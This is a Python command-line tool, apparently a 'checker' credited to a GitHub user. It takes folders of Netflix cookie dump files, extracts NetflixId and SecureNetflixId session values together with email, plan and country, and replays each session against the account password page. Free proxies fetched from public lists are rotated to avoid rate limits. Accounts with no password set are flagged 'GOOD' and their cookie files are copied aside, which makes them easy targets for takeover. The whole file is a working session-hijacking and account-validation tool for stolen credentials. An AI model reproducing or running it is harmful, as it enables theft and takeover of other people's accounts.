#!/usr/bin/env python3
import os, sys, re, glob, json, time, shutil
import requests
from colorama import init, Fore, Back, Style

init(autoreset=True)

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + r'''
 ███▄    █   █████▒██▓███   ██▓    ▄▄▄     ▓██   ██▓
 ██ ▀█   █ ▓██   ▒▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
▓██  ▀█ ██▒▒████ ░▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
▓██▒  ▐▌██▒░▓█▒  ░▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
▒██░   ▓██░░▒█░   ▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
░ ▒░   ▒ ▒  ▒ ░   ▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒
░ ░░   ░ ▒░ ░     ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░
   ░   ░ ░  ░ ░   ░░         ░ ░    ░   ▒   ▒ ▒ ░░
         ░                     ░  ░     ░  ░░ ░
                                            ░ ░''' + Fore.RED + Style.DIM + '''
                                github: n5za''' + Style.RESET_ALL)


def parse_cookie_file(path):
    nfid = snfid = email = plan = payments = country = None
    with open(path, 'r', errors='ignore') as f:
        for line in f:
            raw = line.strip()
            if raw.startswith('\u2013 Email:') or raw.startswith('– Email:'):
                email = raw.split(':', 1)[1].strip()
            if raw.startswith('.netflix.com') and 'NetflixId' in raw:
                parts = [p.strip() for p in raw.split('\t')]
                if 'NetflixId' in parts:
                    nfid = parts[parts.index('NetflixId') + 1]
                if 'SecureNetflixId' in parts:
                    snfid = parts[parts.index('SecureNetflixId') + 1]
    basename = os.path.basename(path).replace('.txt', '')
    m = re.findall(r'\[(.*?)\]', basename)
    plan = m[0] if len(m) >= 1 else '?'
    payments = m[1] if len(m) >= 2 else '?'
    country = m[3] if len(m) >= 4 else '?'
    return email or '?', nfid, snfid, plan, payments, country


PROXY_SOURCES = [
    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
]


def fetch_free_proxies():
    seen = set()
    proxies = []
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                p = line.replace('http://', '').replace('https://', '')
                if p not in seen:
                    seen.add(p)
                    proxies.append(f'http://{p}')
        except Exception:
            pass
    return proxies


class ProxyRotator:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.idx = 0

    def next(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx % len(self.proxies)]
        self.idx += 1
        return p


def check_password_state(nfid, snfid, proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    s.cookies.set('NetflixId', nfid, domain='.netflix.com')
    if snfid:
        s.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')

    try:
        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
        if r.status_code != 200 or 'login' in r.url.lower():
            return 'DEAD', ''

        has_new_pwd = 'newPassword' in r.text
        has_cur_pwd = 'currentPassword' in r.text

        if has_new_pwd and not has_cur_pwd:
            return 'GOOD', 'free account (no password set)'
        elif has_new_pwd and has_cur_pwd:
            return 'BAD', 'has password'
        else:
            return 'UNKNOWN', 'cannot determine'

    except Exception as e:
        return 'ERROR', str(e)[:50]


def progress_bar(current, total, bar_len=30):
    filled_len = int(bar_len * current // total) if total else 0
    bar = Fore.GREEN + '█' * filled_len + Fore.WHITE + '░' * (bar_len - filled_len) + Style.RESET_ALL
    pct = f'{current/total*100:.0f}%' if total else '?'
    return f'[{bar}] {pct}'


def main():
    banner()

    # ── PARSE ARGS ──
    args = sys.argv[1:]
    COOKIES_DIR = None
    FILTER = None
    OUTPUT_DIR = None
    auto_proxy = True
    proxy_file = None

    i = 0
    while i < len(args):
        a = args[i]
        if a == '--no-proxy':
            auto_proxy = False
        elif a == '--proxy-file' and i + 1 < len(args):
            proxy_file = args[i + 1]
            i += 1
        elif a.startswith('--'):
            pass
        elif COOKIES_DIR is None:
            COOKIES_DIR = a
        else:
            FILTER = a
        i += 1

    if not COOKIES_DIR:
        print(Fore.CYAN + '📁 Enter cookies folder path:' + Style.RESET_ALL)
        COOKIES_DIR = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        if not COOKIES_DIR:
            print(Fore.RED + '❌ No path provided.' + Style.RESET_ALL)
            sys.exit(1)

    PLAN_OPTIONS = {'1': 'Basic', '2': 'Standard', '3': 'Premium'}
    if not FILTER:
        print()
        print(Fore.CYAN + 'Select plan to scan:' + Style.RESET_ALL)
        for k, v in PLAN_OPTIONS.items():
            print(Fore.WHITE + f'  {k}. {v}' + Style.RESET_ALL)
        print(Fore.WHITE + '  4. All (scan everything)' + Style.RESET_ALL)
        choice = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        if choice in PLAN_OPTIONS:
            FILTER = PLAN_OPTIONS[choice]

    BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-password')
    folder_name = os.path.basename(os.path.normpath(COOKIES_DIR))
    if FILTER:
        folder_name = FILTER.lower().replace(' ', '-')
    OUTPUT_DIR = os.path.join(BASE_DIR, folder_name)
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # ── PROXY SETUP ──
    rotator = ProxyRotator()
    if auto_proxy:
        print(Fore.CYAN + '\n🌐 Fetching free proxies...' + Style.RESET_ALL)
        proxies = fetch_free_proxies()
        if proxies:
            rotator = ProxyRotator(proxies)
            print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + '   ⚠ No proxies found, using direct IP' + Style.RESET_ALL)
    elif proxy_file:
        if os.path.isfile(proxy_file):
            with open(proxy_file) as f:
                proxies = [f'http://{l.strip()}' for l in f if l.strip()]
            if proxies:
                rotator = ProxyRotator(proxies)
                print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies from {proxy_file}' + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + '   ⚠ Proxy file empty, using direct IP' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f'   ⚠ File not found: {proxy_file}, using direct IP' + Style.RESET_ALL)

    # ── LOAD FILES ──
    files = sorted(glob.glob(os.path.join(COOKIES_DIR, '*.txt')))
    if FILTER:
        files = [f for f in files if FILTER in os.path.basename(f)]

    if not files:
        print(Fore.RED + f'\n❌ No .txt files found in: {COOKIES_DIR}' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n📊 Loaded {len(files)} cookie files' + (f' [{FILTER}]' if FILTER else '') + Style.RESET_ALL)
    print(Fore.CYAN + f'📁 Output: {OUTPUT_DIR}' + Style.RESET_ALL)
    print(Fore.CYAN + '─' * 55 + Style.RESET_ALL)
    time.sleep(0.5)

    # ── FILES ──
    good_file = os.path.join(OUTPUT_DIR, 'good_no_password.txt')
    bad_file = os.path.join(OUTPUT_DIR, 'bad_has_password.txt')
    dead_file = os.path.join(OUTPUT_DIR, 'dead.txt')
    good_cookies_dir = os.path.join(OUTPUT_DIR, 'good_cookies')
    os.makedirs(good_cookies_dir, exist_ok=True)

    stats = {'good': 0, 'bad': 0, 'dead': 0, 'error': 0, 'proxy_switches': 0}
    t0 = time.time()

    for i, fpath in enumerate(files):
        email, nfid, snfid, plan, payments, country = parse_cookie_file(fpath)

        if not nfid:
            with open(dead_file, 'a') as f:
                f.write(f'{os.path.basename(fpath).replace(".txt","")} | no NetflixId\n')
            stats['error'] += 1
            continue

        proxy = rotator.next()
        max_retries = 3 if proxy else 1
        status = reason = None
        for attempt in range(max_retries):
            status, reason = check_password_state(nfid, snfid, proxy)
            if status != 'ERROR':
                break
            proxy = rotator.next()
            stats['proxy_switches'] += 1

        label = os.path.basename(fpath).replace('.txt', '')
        line = f'{label} | Email: {email} | Plan: {plan} | Payments: {payments} | Country: {country}'

        if status == 'GOOD':
            stats['good'] += 1
            with open(good_file, 'a') as f:
                f.write(line + '\n')
            shutil.copy2(fpath, os.path.join(good_cookies_dir, os.path.basename(fpath)))
            print(Fore.GREEN + Style.BRIGHT + f'  ✓ #{stats["good"]:>3} GOOD  | {email or label:35s} | {plan:5s} | {country}' + Style.RESET_ALL, flush=True)

        elif status == 'BAD':
            stats['bad'] += 1
            with open(bad_file, 'a') as f:
                f.write(line + '\n')

        elif status == 'DEAD':
            stats['dead'] += 1
            with open(dead_file, 'a') as f:
                f.write(line + ' | DEAD\n')

        else:
            stats['error'] += 1
            with open(dead_file, 'a') as f:
                f.write(line + f' | {status}: {reason}\n')

        # ── PROGRESS ──
        if (i + 1) % 25 == 0 or i == len(files) - 1:
            elapsed = time.time() - t0
            rate = (i + 1) / elapsed * 60 if elapsed > 0 else 0
            remaining = (len(files) - i - 1) / max(rate, 0.1) if rate > 0 else 0
            bar = progress_bar(i + 1, len(files))
            print(Fore.WHITE + Style.DIM + f'  {bar}  [{i+1}/{len(files)}]  '
                  f'{Fore.GREEN}✔{stats["good"]}{Fore.WHITE}  '
                  f'{Fore.RED}✘{stats["bad"]}{Fore.WHITE}  '
                  f'{Fore.YELLOW}💀{stats["dead"]}{Fore.WHITE}  '
                  f'{Fore.MAGENTA}!{stats["error"]}{Fore.WHITE}  '
                  f'{rate:.0f}/min  ETA: {remaining:.0f}s  '
                  f'{Fore.CYAN}🔄{stats["proxy_switches"]}{Fore.WHITE}' + Style.RESET_ALL, flush=True)

    # ── SUMMARY ──
    elapsed = time.time() - t0
    print()
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + '  ✅ CHECK COMPLETE' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + f'  ✔ GOOD (no password) : {stats["good"]}' + Style.RESET_ALL)
    print(Fore.RED + f'  ✘ BAD (has password) : {stats["bad"]}' + Style.RESET_ALL)
    print(Fore.YELLOW + f'  💀 DEAD/ERROR        : {stats["dead"] + stats["error"]}' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⏱ Time              : {elapsed:.0f}s ({elapsed/60:.1f}min)' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⚡ Rate              : {len(files)/elapsed*60:.0f} accounts/min' + Style.RESET_ALL)
    if rotator.proxies:
        print(Fore.CYAN + f'  🔄 Proxy switches     : {stats["proxy_switches"]}' + Style.RESET_ALL)
        print(Fore.CYAN + f'  🌐 Proxies loaded     : {len(rotator.proxies)}' + Style.RESET_ALL)
    print()
    print(Fore.CYAN + f'  📁 GOOD list : {OUTPUT_DIR}/good_no_password.txt' + Style.RESET_ALL)
    print(Fore.CYAN + f'  📁 GOOD files : {good_cookies_dir}/' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)


if __name__ == '__main__':
    main()
